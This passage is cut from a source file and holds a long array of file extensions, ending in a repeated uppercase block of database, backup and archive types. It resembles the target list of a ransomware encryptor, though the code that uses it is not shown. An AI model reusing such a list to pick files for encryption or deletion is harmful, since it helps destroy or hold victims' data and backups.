					"gla", "gld", "glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl",
					"gml", "gmp", "gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3",
					"gp4", "gpd", "gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan",
					"gpx", "gpz", "gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey",
					"grf", "grib", "grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr",
					"grs", "grt", "grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet",
					"gslides", "gsm", "GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp",
					"gts", "gui", "guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl",
					"gxt", "gz", "gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11",
					"h12", "h13", "h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o",
					"h2w", "h3m", "h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml",
					"hbk", "hbl", "hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr",
					"hcu", "hcw", "hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl",
					"hdpmx", "hds", "hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex",
					"hfd", "hfs", "hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb",
					"HKF", "hkx", "hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3",
					"hml", "hmskin", "hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2",
					"hpd", "hpj", "hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx",
					"hs", "hs2", "hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg",
					"htm", "htm~", "html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc",
					"HVE", "hvpl", "hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN",
					"hxq", "hxr", "hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02",
					"i5z", "iab", "iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb",
					"ibcd", "ibd", "ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo",
					"icbu", "icc", "icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics",
					"icst", "icxs", "id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml",
					"idp", "idx", "ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff",
					"ifiction", "ifm", "ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr",
					"ihf", "ihp", "ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg",
					"ilogicvb", "ima", "image", "imd", "img", "imp", "imr", "imt", "imz", "in",
					"INBOX", "INC", "incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp",
					"indt", "inf", "info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins",
					"inss", "installhelper", "insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias",
					"ipd", "ipf", "iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock",
					"irp", "irr", "irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso",
					"ispc", "ispx", "ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm",
					"itmsp", "itmz", "itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc",
					"ivd", "ivs", "ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj",
					"iwtpl", "iwxdata", "ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar",
					"jasper", "jav", "java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr",
					"jc", "jclic", "JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif",
					"JFM", "jgcscs", "jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp",
					"jnb", "jnt", "joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg",
					"jpf", "jpg", "jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint",
					"JRS", "jrxml", "js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx",
					"jtbackup", "jtd", "jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww",
					"k25", "k3b", "kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2",
					"kdb", "kdbx", "kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi",
					"kexic", "kexis", "key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp",
					"kgtemp", "kid", "kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno",
					"knt", "kos", "kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd",
					"ksm", "ksp", "kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp",
					"l", "l01", "l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat",
					"latex", "lav", "lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx",
					"lcb", "lcd", "lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldf",
					"ldif", "lef", "lev", "lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf",
					"lgh", "lgi", "lgl", "lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life",
					"lin", "list", "lit", "litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb",
					"llv", "llx", "LM", "lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt",
					"lnx", "LO_", "loc", "localstorage", "log", "LOG1", "logonxp", "lok", "lot", "lp",
					"lp2", "lp7", "lpa", "lpc", "lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd",
					"lpp", "lpx", "lqm", "lrcat", "lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit",
					"ls3", "ls5", "lsa", "lsd", "lsf", "lsl", "lsp", "lsr", "lst", "lsu",
					"ltcx", "ltm", "ltr", "LTS", "ltx", "lua", "lud", "lut", "lutx", "lvd",
					"lvivt", "lvl", "lvm", "lvw", "lw4", "lwd", "lwo", "lwp", "lwx", "lx01",
					"lxf", "lxk", "ly", "lyt", "lyx", "m", "m13", "m14", "m2", "m2ts",
					"m3u", "m3u8", "m4a", "m4p", "m4u", "m4v", "m7p", "maca", "maf", "mag",
					"mai", "maker", "maml", "man", "manu", "map", "mapimail", "MAPSTYLE", "maq", "mar",
					"marc", "markdn", "mars", "marshal", "mas", "mass", "mat", "mav", "max", "maxfr",
					"maxm", "mba", "mbbk", "mbd", "mbf", "mbg", "mbi", "mbox", "mbp", "mbx",
					"mc1", "mc9", "mcat", "mcd", "mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp",
					"mcrp", "mcw", "mcx", "md", "md0", "md1", "md2", "md3", "md5", "md8",
					"mdb", "mdbackup", "mdbhtml", "mdc", "mdccache", "mdd", "mddata", "mdf", "mdg", "mdi",
					"mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn", "mds", "mdsx", "MDT", "mdx",
					"MDZ", "mecontact", "med", "mef", "meg", "mega", "meh", "mell", "mellel", "mem",
					"menc", "menu", "meo", "merlin2", "met", "METADATA", "metadata_never_index", "mex", "mf", "mf4",
					"mfa", "mfe", "mfl", "mfo", "mfp", "mft", "mfu", "mfv", "mfw", "mga",
					"mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht", "mhtenx", "mhtmlenx", "mi", "mic",
					"mid", "mif", "mim", "mime", "mindnode", "miniso", "mip", "mission", "mix", "mjd",
					"mjdoc", "mjk", "mkd", "mke", "mkv", "mla", "mlb", "mlc", "mlj", "mlm",
					"mls", "mlsxml", "mlx", "mm", "mm6", "mm7", "mm8", "mmap", "mmc", "mmd",
					"mme", "mmf", "mmjs", "mml", "mmm", "mmo", "mmp", "mmsw", "mmw", "mnc",
					"mng", "MNI", "mnk", "mno", "mny", "mo", "mobi", "mod", "MODEL", "MOF",
					"moho", "mol", "money", "moneywell", "mos", "mosaic", "mov", "movie", "mox", "moz",
					"mp1", "mp2", "mp4v", "mpa", "mpd", "mpe", "mpeg", "mpf", "mpg", "mph",
					"mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge", "mpr", "mps", "mpt", "mpv",
					"mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg", "mru", "mrw", "mrwref", "ms",
					"ms10", "msb", "msc", "msct", "msd", "mse", "msf", "msg", "mshc", "msie",
					"msim", "msl", "mso", "msor", "msp", "msq", "mss", "ms-tnef", "msw", "mswd",
					"mtdd", "mte", "mtf", "mtff", "mth", "MTL", "mtm", "mtml", "mto", "mtp",
					"mts", "mtw", "mtx", "mtxt", "mud", "mug", "mui", "mum", "mup", "mvd",
					"mvdx", "mvex", "mvm", "mw", "mwb", "mwd", "mwf", "mwii", "mwpd", "mwpp",
					"mws", "mwx", "mx", "mxad", "mxc2", "mxd", "mxg", "mxi", "mxl", "mxp",
					"myd", "mydocs", "myi", "myo", "mz", "n3", "nam", "names", "nap", "narrative",
					"nas", "nav", "navmap", "nb", "nb7", "nba", "nbak", "nbd", "nbe", "nbf",
					"nbi", "nbk", "nbp", "nbs", "nbu", "nc", "ncd", "ncf", "nco", "ncorx",
					"nct", "nd", "nda", "ndb", "ndd", "ndf", "ndif", "ndk", "ndl", "ndr",
					"nds", "ndx", "ne1", "ne3", "nef", "nessus", "net", "neta", "netspd", "netspm",
					"NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs", "nfs11save", "ng", "NGR",
					"nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP", "NLT", "nma", "nmbtemplate",
					"nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni", "NNM", "nnp", "nnt",
					"nokogiri", "nop", "not", "note", "notebook", "now", "noy", "np", "npd", "npdf",
					"npf", "npl", "npp", "npr", "nps", "npt", "npy", "nrb", "nrbak", "nrc",
					"nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib", "nrs", "nrt", "nru",
					"nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsf", "nsg", "nsh", "nsq",
					"nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx", "NU2", "number",
					"numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl", "nvl", "nvm",
					"nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo", "nwp", "nws",
					"nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3", "oab", "oad",
					"oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt", "obx", "obz",
					"occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc", "odccubefile", "odf",
					"odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods", "odt", "odt#",
					"odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui", "ofm", "ofn",
					"oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu", "ogs", "oil",
					"ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event", "olk14group", "olk14note",
					"olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg", "omlog", "omp",
					"onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos", "oot", "op",
					"op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju", "oplx", "opn",
					"opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5", "or6", "ora",
					"orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd", "osdx", "ost",
					"osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl", "otln", "otn",
					"otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd", "ovf", "ovolog",
					"ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01", "p10", "p12",
					"p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c", "p7x", "p7z",
					"p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef", "pak", "pan",
					"paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf", "pbix", "pbj",
					"PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap", "pcapng", "pcb",
					"pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS", "pct", "pcv",
					"pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr", "pdd", "pdf",
					"pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl", "pdfua", "pdfvt",
					"pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp", "pds", "pdw",
					"pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes", "pex", "pez",
					"pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx", "pg", "pgd",
					"pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih", "pixexp", "pj2",
					"pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey", "pkg", "pkh",
					"pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc", "pld", "pli",
					"pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3", "pm4", "pm5",
					"pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo", "pmr", "pmt",
					"pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC", "pod", "poi",
					"pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp", "pp2", "pp3",
					"ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps", "ppsenx", "ppsm",
					"ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt", "pptx", "ppws",
					"ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2", "prj", "prn",
					"pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd", "pro5pl", "pro5plx",
					"pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs", "prt", "prtc",
					"prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3", "psb", "psd",
					"PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm", "PSM1", "psmd",
					"pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx", "psz", "pt3",
					"pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2", "pts", "ptx",
					"PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz", "pvd", "pve",
					"pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf", "pwi", "pwm",
					"pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp", "py", "pys",
					"pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb", "qb2005", "qb2006",
					"qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015", "qb2016", "qb2017",
					"qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb", "qbmd", "qbr",
					"qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct", "qdat", "qdb",
					"qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel", "qf", "qfilter",
					"qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif", "qlgenerator", "qm",
					"qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx", "qrp", "qrt",
					"qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw", "QUE", "quiz",
					"quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt", "qxb", "qxd",
					"qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03", "r0f", "r0z",
					"r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap", "rar", "RAT",
					"ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk", "rbs", "rbt",
					"rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd", "rd1", "rda",
					"rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx", "rdo", "rdoc",
					"rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref", "reference", "rel",
					"rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW", "ret", "rev",
					"rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb", "rgmc", "rgn",
					"rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl", "rlf", "rll",
					"rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx", "rna", "rng",
					"rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx", "rodz", "rofl",
					"rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox", "roxio", "roz",
					"rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres", "rpt", "rptr",
					"rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc", "rsd", "rsdf",
					"rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv", "rsw", "rt",
					"rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk", "rtp", "rtpi",
					"rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel", "rum", "run",
					"rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg", "rwl", "rwlibrary",
					"rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn", "sa5", "sa7",
					"sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam", "sar", "sas7bdat",
					"sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn", "sbo", "sbpf",
					"sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4", "sc45", "sca",
					"scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs", "sch", "SCHEMA",
					"scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs", "scspack", "scssc",
					"sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda", "sdb", "sdc",
					"sdd", "sddraft", "sdf", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo", "sdoc",
					"sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1", "SEARCH-MS",
					"secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server", "ses",
					"set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi", "sgl",
					"sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP", "shr",
					"shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn", "sidx",
					"sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky", "sla",
					"sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp", "slt",
					"slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi", "smlx",
					"smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2", "sna",
					"snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt", "snx",
					"so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg", "spj",
					"spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz", "sps",
					"spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql", "sqlite",
					"sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM", "SRD-WAL",
					"srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd", "ssh",
					"ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5", "st6",
					"st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti", "stk",
					"stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt", "stu",
					"stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf", "sum",
					"surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm", "svn",
					"svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch", "swk",
					"swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm", "sxml",
					"sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05", "t06",
					"t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15", "t16",
					"t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64", "t80",
					"ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab", "tabula-doc",
					"tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS", "tax",
					"tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17", "tax2008",
					"tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017", "tax2018",
					"tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx", "tbz2",
					"tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0", "tda",
					"TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr", "tdt",
					"te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter", "terrn",
					"terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa", "tfd",
					"tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz", "THA",
					"thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff", "tig",
					"time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld", "tlg",
					"tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME", "tml",
					"tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns", "tnsp",
					"toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb", "totalslayout",
					"tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu", "tpx",
					"tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk", "trm",
					"trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr", "tst",
					"tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17", "tt18",
					"tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt", "tu",
					"tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh", "twm",
					"tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm", "txn",
					"txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax", "ubj",
					"ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb", "udf",
					"udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr", "ulf",
					"uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d", "unr",
					"UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk", "upoi",
					"upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr", "ustar",
					"usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm", "uts",
					"utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf", "uxx",
					"v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd", "vbk",
					"vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4", "vc6",
					"vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd", "vcs",
					"vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx", "vec",
					"VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi", "vibe",
					"view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx", "vmdk",
					"vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx", "vmxf",
					"vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd", "vpk",
					"vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp", "vs",
					"vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm", "vssx",
					"vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud", "vvf",
					"vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02", "W2B",
					"w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w", "w8bn",
					"w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav", "wave",
					"waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi", "wbk",
					"wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp", "wcst",
					"wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl", "wdn",
					"wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep", "WER",
					"wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil", "wim",
					"win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3", "wk4",
					"wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll", "wls",
					"wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga", "wmk",
					"wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn", "wnk",
					"wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42", "wp5",
					"wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0", "wpd1",
					"wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps", "wpt",
					"wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2", "ws3",
					"ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh", "wsi",
					"wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp", "wtp",
					"wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx", "WWD",
					"wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn", "wzs",
					"x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML", "xamlx",
					"xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl", "xbt",
					"xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo", "xdoc",
					"xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf", "xfi",
					"xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml", "xgmml",
					"xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf", "xl",
					"xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff", "xline",
					"xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse", "xlshtml",
					"xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx", "xlv",
					"xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf", "xmi",
					"xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms", "xmt_bin",
					"xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj", "xpll",
					"xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx", "xrb",
					"xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl", "xslt",
					"xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps", "xtrl",
					"xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid", "xvl",
					"xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe", "xxx",
					"xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra", "ychat",
					"yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm", "yrcdat",
					"yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct", "ZFSENDTOTARGET",
					"zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps", "ztmp",
					"ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG", "DB",
					"BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP", "BAC",
					"AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS", "ZIP",
					"RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX", "DOC",
					"DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC", "ACCDE",
